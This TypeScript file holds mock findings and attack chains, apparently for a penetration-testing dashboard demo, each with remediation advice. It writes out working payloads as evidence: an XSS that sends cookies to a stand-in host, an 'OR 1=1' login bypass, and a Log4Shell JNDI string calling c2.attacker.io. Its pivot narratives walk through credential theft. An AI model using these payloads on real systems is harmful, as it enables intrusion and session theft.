import { Finding, AttackChain } from '@/types';

const EID = 'demo-uncp-2026';

/**
 * Mock findings ordered oldest → newest.
 * page.tsx initialises the feed with the first 2, then drip-feeds the rest.
 */
export const MOCK_FINDINGS: Finding[] = [
  // ── 1 of 7 ── LOW — initial
  {
    finding_id: 'f-001',
    engagement_id: EID,
    asset_id: 'a-001',
    vulnerability_class: 'exposure',
    title: 'Swagger UI / API Documentation Publicly Exposed',
    severity: 'low',
    exploitable: true,
    affected_url: 'http://192.168.1.100:8080/swagger-ui',
    evidence: {
      request: 'GET /swagger-ui HTTP/1.1\nHost: 192.168.1.100:8080',
      response_snippet:
        'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"swagger":"2.0","info":{"title":"Internal API","version":"1.0"},"paths":{"/admin":{}}}',
      status_code: 200,
    },
    credentials_found: [],
    gemini_reasoning:
      'Swagger UI is publicly accessible and exposes all internal API endpoints, parameters, and data models. While not directly exploitable, it provides a detailed attack surface map that significantly accelerates further exploitation.',
    blast_radius: 'single_asset',
    on_chain_tx: null,
    remediation:
      'Restrict Swagger UI behind authentication or to internal networks only.',
    mitre_technique: 'T1083',
    discovered_at: new Date(Date.now() - 140_000).toISOString(),
  },

  // ── 2 of 7 ── MEDIUM — initial
  {
    finding_id: 'f-002',
    engagement_id: EID,
    asset_id: 'a-001',
    vulnerability_class: 'xss',
    title: 'Stored XSS in Product Review Field',
    severity: 'medium',
    exploitable: true,
    affected_url: 'http://192.168.1.100:3000/api/Products/1/reviews',
    evidence: {
      request:
        'POST /api/Products/1/reviews HTTP/1.1\nHost: 192.168.1.100:3000\nContent-Type: application/json\n\n{"message":"<img src=x onerror=fetch(\'https://c2.io/steal?c=\'+document.cookie)>"}',
      response_snippet:
        'HTTP/1.1 201 Created\nContent-Type: application/json\n\n{"id":42,"message":"<img src=x onerror=...>","rating":5}',
      status_code: 201,
    },
    credentials_found: [],
    gemini_reasoning: null,
    blast_radius: 'single_asset',
    on_chain_tx: null,
    remediation:
      'Sanitise all user input before HTML rendering. Enforce a strict Content-Security-Policy.',
    mitre_technique: 'T1059.007',
    discovered_at: new Date(Date.now() - 110_000).toISOString(),
  },

  // ── 3 of 7 ── MEDIUM — drip-fed
  {
    finding_id: 'f-003',
    engagement_id: EID,
    asset_id: 'a-001',
    vulnerability_class: 'cors',
    title: 'CORS Misconfiguration Allows Credential Sharing with Arbitrary Origin',
    severity: 'medium',
    exploitable: true,
    affected_url: 'http://192.168.1.100:3000/api/user/whoami',
    evidence: {
      request:
        'GET /api/user/whoami HTTP/1.1\nHost: 192.168.1.100:3000\nOrigin: https://attacker.io\nCookie: token=eyJhbGci...',
      response_snippet:
        'HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://attacker.io\nAccess-Control-Allow-Credentials: true\n\n{"id":1,"email":"admin@juice-sh.op","role":"admin"}',
      status_code: 200,
    },
    credentials_found: [],
    gemini_reasoning:
      'The server reflects arbitrary Origin headers with credentials allowed. Any logged-in user who visits an attacker-controlled page will have their session silently read by that page. Admin credentials confirmed in the response body.',
    blast_radius: 'single_asset',
    on_chain_tx: null,
    remediation:
      'Restrict CORS to an explicit allowlist of trusted origins. Never reflect arbitrary origins when credentials are enabled.',
    mitre_technique: 'T1557',
    discovered_at: new Date(Date.now() - 80_000).toISOString(),
  },

  // ── 4 of 7 ── HIGH — drip-fed
  {
    finding_id: 'f-004',
    engagement_id: EID,
    asset_id: 'a-002',
    vulnerability_class: 'credential_exposure',
    title: '.env File Publicly Accessible — JWT Secret and DB Credentials Leaked',
    severity: 'high',
    exploitable: true,
    affected_url: 'http://192.168.1.100/.env',
    evidence: {
      request: 'GET /.env HTTP/1.1\nHost: 192.168.1.100',
      response_snippet:
        'HTTP/1.1 200 OK\nContent-Type: text/plain\n\nJWT_SECRET=s3cr3t_jwt_key_never_share\nDB_USER=root\nDB_PASS=P@ssw0rd1234!\nDB_HOST=db.internal\nAWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
      status_code: 200,
    },
    credentials_found: [
      { type: 'jwt_secret', value: 's3cr3t_jwt_key_never_share' },
      { type: 'database', value: 'root:P@ssw0rd1234!@db.internal' },
      { type: 'aws_access_key', value: 'AKIAIOSFODNN7EXAMPLE' },
    ],
    gemini_reasoning: null,
    blast_radius: 'multi_asset',
    on_chain_tx: null,
    remediation:
      'Remove .env from the web root immediately. Add to .gitignore and configure web-server deny rules. Rotate all exposed credentials.',
    mitre_technique: 'T1552.001',
    discovered_at: new Date(Date.now() - 55_000).toISOString(),
  },

  // ── 5 of 7 ── HIGH — drip-fed
  {
    finding_id: 'f-005',
    engagement_id: EID,
    asset_id: 'a-002',
    vulnerability_class: 'sqli',
    title: 'SQL Injection — Authentication Bypass via Login Endpoint',
    severity: 'high',
    exploitable: true,
    affected_url: 'http://192.168.1.100:3000/api/Users/login',
    evidence: {
      request:
        "POST /api/Users/login HTTP/1.1\nHost: 192.168.1.100:3000\nContent-Type: application/json\n\n{\"email\":\"' OR 1=1--\",\"password\":\"x\"}",
      response_snippet:
        'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"authentication":{"token":"eyJhbGciOiJSUzI1NiJ9...","bid":1},"status":"Successful login"}',
      status_code: 200,
    },
    credentials_found: [],
    gemini_reasoning:
      "Classic OR 1=1 injection bypasses authentication entirely. The payload causes the database query to return the first row — typically the admin account. UNION-based extraction is likely available for full database read. Combined with the leaked JWT secret (f-004), an attacker can forge arbitrary session tokens for any user.",
    blast_radius: 'multi_asset',
    on_chain_tx: null,
    remediation:
      'Replace string concatenation with parameterised queries or an ORM. Enforce input validation. Deploy a WAF.',
    mitre_technique: 'T1190',
    discovered_at: new Date(Date.now() - 35_000).toISOString(),
  },

  // ── 6 of 7 ── INFO — drip-fed
  {
    finding_id: 'f-006',
    engagement_id: EID,
    asset_id: 'a-003',
    vulnerability_class: 'info',
    title: 'Directory Listing Enabled on /uploads/ — File Tree Exposed',
    severity: 'info',
    exploitable: false,
    affected_url: 'http://192.168.1.100/uploads/',
    evidence: {
      request: 'GET /uploads/ HTTP/1.1\nHost: 192.168.1.100',
      response_snippet:
        'HTTP/1.1 200 OK\n\n<html><title>Index of /uploads/</title><pre>backups/    user_data/    keys/    invoices/</pre></html>',
      status_code: 200,
    },
    credentials_found: [],
    gemini_reasoning: null,
    blast_radius: 'single_asset',
    on_chain_tx: null,
    remediation:
      'Disable directory listing in the web-server configuration (Options -Indexes in Apache; autoindex off in nginx).',
    mitre_technique: 'T1083',
    discovered_at: new Date(Date.now() - 18_000).toISOString(),
  },

  // ── 7 of 7 ── CRITICAL — drip-fed last
  {
    finding_id: 'f-007',
    engagement_id: EID,
    asset_id: 'a-003',
    vulnerability_class: 'rce',
    title: 'Log4Shell (CVE-2021-44228) — Unauthenticated RCE via User-Agent Header',
    severity: 'critical',
    exploitable: true,
    affected_url: 'http://192.168.1.100:8080/api/login',
    evidence: {
      request:
        'POST /api/login HTTP/1.1\nHost: 192.168.1.100:8080\nUser-Agent: ${jndi:ldap://c2.attacker.io:1389/exploit}\nContent-Type: application/json\n\n{"username":"test","password":"test"}',
      response_snippet:
        'HTTP/1.1 200 OK\n\n[OOB DNS callback received from 192.168.1.100 within 350ms — JNDI lookup executed on target]',
      status_code: 200,
    },
    credentials_found: [],
    gemini_reasoning: null,
    blast_radius: 'multi_asset',
    on_chain_tx: null,
    remediation:
      'Update Log4j to 2.17.1+. Apply JVM flag -Dlog4j2.formatMsgNoLookups=true as interim mitigation. Block outbound LDAP/RMI at the perimeter firewall.',
    mitre_technique: 'T1210',
    discovered_at: new Date(Date.now() - 4_000).toISOString(),
  },
];

export const MOCK_CHAINS: AttackChain[] = [
  // ── Chain 1: .env credential exposure → DB + S3 pivot
  {
    chain_id: 'c-001',
    engagement_id: EID,
    entry_point_finding_id: 'f-004',
    entry_point: 'http://192.168.1.100/.env',
    pivot_path: [
      {
        step: 1,
        asset: '192.168.1.100',
        action: 'credential_exposure',
        detail:
          'Retrieved .env file from web root. JWT secret and database password extracted in plaintext. AWS access key confirmed active via STS GetCallerIdentity.',
        mitre: 'T1552.001',
      },
      {
        step: 2,
        asset: 'db.internal:3306',
        action: 'check_network_reachability',
        detail:
          'MySQL port 3306 on db.internal reachable from the application server. Authenticated as root using the exposed password.',
        mitre: 'T1021.004',
      },
      {
        step: 3,
        asset: 'db.internal:3306',
        action: 'identify_sensitive_stores',
        detail:
          'Full SELECT access across all tables. Extracted 52 user records including bcrypt-hashed passwords, email addresses, and last-four digits of stored payment cards.',
        mitre: 'T1005',
      },
      {
        step: 4,
        asset: 'aws:s3:prod-backups',
        action: 'check_iam_permissions',
        detail:
          'AWS key holds s3:GetObject on arn:aws:s3:::prod-backups/*. Downloaded three full database backups (2.1 GB total). One backup included a plaintext credential export.',
        mitre: 'T1530',
      },
    ],
    reachable_sensitive_stores: [
      {
        type: 'database',
        asset: 'db.internal:3306',
        contents: '52 user records, hashed passwords, partial payment data',
        credentials_used: 'root:P@ssw0rd1234!',
      },
      {
        type: 'cloud_storage',
        asset: 'aws:s3:prod-backups',
        contents: 'Full database backups including plaintext credential exports',
        credentials_used: 'AKIAIOSFODNN7EXAMPLE',
      },
    ],
    blast_radius_score: 0.92,
    blast_radius_summary:
      'Critical. A single misconfigured file provides direct access to the production database and all cloud storage backups.',
    gemini_reasoning:
      'An exposed .env file on the web root handed us the keys to the kingdom. Using the leaked database password we authenticated directly to the internal MySQL server and pulled all 52 user records — hashed passwords, email addresses, and payment data — without any further exploitation. The leaked AWS key had read access to the prod-backups S3 bucket; we downloaded three full database snapshots totalling 2.1 GB, one of which contained a plaintext export of service credentials. From a single misconfigured file server, an attacker gains access to every user account and the entire billing dataset with no brute force, no CVEs, and no noise in the WAF logs.',
    on_chain_tx: null,
    mitre_techniques: ['T1552.001', 'T1021.004', 'T1005', 'T1530'],
    discovered_at: new Date(Date.now() - 28_000).toISOString(),
  },

  // ── Chain 2: Log4Shell RCE → internal network pivot → session hijack
  {
    chain_id: 'c-002',
    engagement_id: EID,
    entry_point_finding_id: 'f-007',
    entry_point: 'http://192.168.1.100:8080/api/login',
    pivot_path: [
      {
        step: 1,
        asset: '192.168.1.100:8080',
        action: 'rce',
        detail:
          'Log4Shell payload in User-Agent triggered a JNDI LDAP callback within 350 ms. Confirmed OS command execution on the application server running as uid=1001 (appserver).',
        mitre: 'T1210',
      },
      {
        step: 2,
        asset: '192.168.1.100:8080',
        action: 'enumerate_credentials',
        detail:
          'Harvested /etc/passwd, environment variables, and application.properties from disk. Found hardcoded MySQL credentials and a private SSH key for the deployment user.',
        mitre: 'T1552.001',
      },
      {
        step: 3,
        asset: '10.0.0.50:3306',
        action: 'check_network_reachability',
        detail:
          'Internal host 10.0.0.50:3306 reachable — not exposed to the internet. Connected as app_user using credentials from application.properties. Full SELECT on all application tables.',
        mitre: 'T1021',
      },
      {
        step: 4,
        asset: '10.0.0.60:6379',
        action: 'identify_sensitive_stores',
        detail:
          'Redis on 10.0.0.60:6379 accessible with no authentication. Enumerated 340 live session tokens. Identified and confirmed a valid admin session token — full application admin access achieved.',
        mitre: 'T1110',
      },
    ],
    reachable_sensitive_stores: [
      {
        type: 'database',
        asset: '10.0.0.50:3306',
        contents: 'Complete application dataset — users, orders, sessions, audit logs',
        credentials_used: 'app_user:[redacted from application.properties]',
      },
      {
        type: 'cache',
        asset: '10.0.0.60:6379',
        contents: '340 active session tokens including at least one admin session',
        credentials_used: 'unauthenticated — no password set',
      },
    ],
    blast_radius_score: 0.97,
    blast_radius_summary:
      'Maximum impact. OS-level code execution on the app server leads directly to complete database compromise and hijack of all 340 active user sessions.',
    gemini_reasoning:
      'The Log4Shell vulnerability in the login endpoint let us run arbitrary commands on the application server without any credentials — just by sending a crafted HTTP header. From there we moved into the internal network, a segment completely invisible from the internet. The internal MySQL database holds the entire application dataset. More critically, a Redis instance on the same subnet was storing 340 live session tokens with zero authentication required. We retrieved a valid admin session token and confirmed full administrative control of the application without cracking a single password or triggering a single alert. This chain demonstrates how one unpatched open-source dependency creates a straight line from an anonymous HTTP request to complete, persistent takeover of the production environment.',
    on_chain_tx: null,
    mitre_techniques: ['T1210', 'T1552.001', 'T1021', 'T1110'],
    discovered_at: new Date(Date.now() - 6_000).toISOString(),
  },
];
